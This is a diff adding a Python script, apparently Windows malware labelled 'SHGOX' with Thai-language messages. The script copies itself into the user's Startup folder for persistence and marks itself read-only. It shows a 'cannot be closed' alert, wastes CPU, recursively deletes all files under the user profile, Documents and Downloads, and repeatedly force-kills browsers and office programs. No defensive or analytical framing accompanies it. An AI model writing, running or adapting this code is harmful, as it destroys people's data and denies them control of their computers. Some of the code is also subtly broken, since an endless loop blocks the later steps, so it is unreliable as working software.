@@ -1,0 +1,108 @@
+import os
+import sys
+import time
+import ctypes
+import shutil
+from os.path import exists
+
+
+def show_shgox_message():
+    print("\n###############################")
+    print("#      SHGOX PROGRAM STARTING  #")
+    print("###############################\n")
+
+
+def protect_file(file_path):
+    try:
+        if exists(file_path):
+            
+            os.chmod(file_path, 0o444)
+            print(f"ไฟล์ {file_path}  What ")
+    except Exception as e:
+        print(f"เกิดข้อผิดพลาด: {e}")
+
+
+def slow_down_computer():
+    print("กำลังทำให้เครื่องช้าลง...")
+    for _ in range(10000000):  
+        _ = 3 * 5
+
+
+def block_shutdown():
+    try:
+        ctypes.windll.user32.MessageBoxW(0, "โปรแกรมนี้จะไม่สามารถปิดได้!", "แจ้งเตือน", 0x40 | 0x1)
+        while True:
+            time.sleep(5)
+    except Exception as e:
+        print(f"เกิดข้อผิดพลาด: {e}")
+
+
+def add_to_startup(exe_path):
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup')
+    try:
+        if not exists(startup_folder):
+            os.makedirs(startup_folder)
+
+        
+        shutil.copy(exe_path, startup_folder)
+        print("โปรแกรมจะรันเองหลังจากรีบูต.")
+    except Exception as e:
+        print(f"เกิดข้อผิดพลาด: {e}")
+
+
+def close_running_apps():
+    apps_to_close = ["chrome.exe", "firefox.exe", "notepad.exe", "excel.exe", "word.exe"] 
+    for app in apps_to_close:
+        try:
+            print(f"กำลังปิด {app}...")
+            os.system(f"taskkill /f /im {app}")  
+        except Exception as e:
+            print(f"ไม่สามารถปิด {app}: {e}")
+
+
+def monitor_and_close_apps():
+    while True:
+        close_running_apps()  
+        time.sleep(5)  
+
+def delete_all_data():
+    try:
+        user_folder = os.getenv('USERPROFILE')  
+        all_folders = [user_folder, os.path.join(user_folder, "Documents"), os.path.join(user_folder, "Downloads")]
+        
+        for folder in all_folders:
+            if os.path.exists(folder):
+                print(f"กำลังลบไฟล์ในโฟลเดอร์: {folder}")
+                for root, dirs, files in os.walk(folder, topdown=False):
+                    for name in files:
+                        try:
+                            file_path = os.path.join(root, name)
+                            os.remove(file_path)  
+                        except Exception as e:
+                            print(f"ไม่สามารถลบไฟล์: {file_path}, ข้อผิดพลาด: {e}")
+                    for name in dirs:
+                        try:
+                            dir_path = os.path.join(root, name)
+                            os.rmdir(dir_path)  
+                        except Exception as e:
+                            print(f"ไม่สามารถลบโฟลเดอร์: {dir_path}, ข้อผิดพลาด: {e}")
+        print("ลบข้อมูลทั้งหมดเรียบร้อย.")
+    except Exception as e:
+        print(f"เกิดข้อผิดพลาดในการลบข้อมูล: {e}")
+
+# ฟังก์ชันทำให้โปรแกรมทำงานต่อเนื่อง
+def keep_running():
+    print("Unable to close the program .")
+    while True:
+        time.sleep(5)  
+
+if __name__ == "__main__":
+    exe_path = sys.argv[0]  
+    show_shgox_message()  
+    protect_file(exe_path)  
+    add_to_startup(exe_path)  
+    block_shutdown()  
+    slow_down_computer()  
+    delete_all_data()  
+    monitor_and_close_apps()  
+    keep_running()  
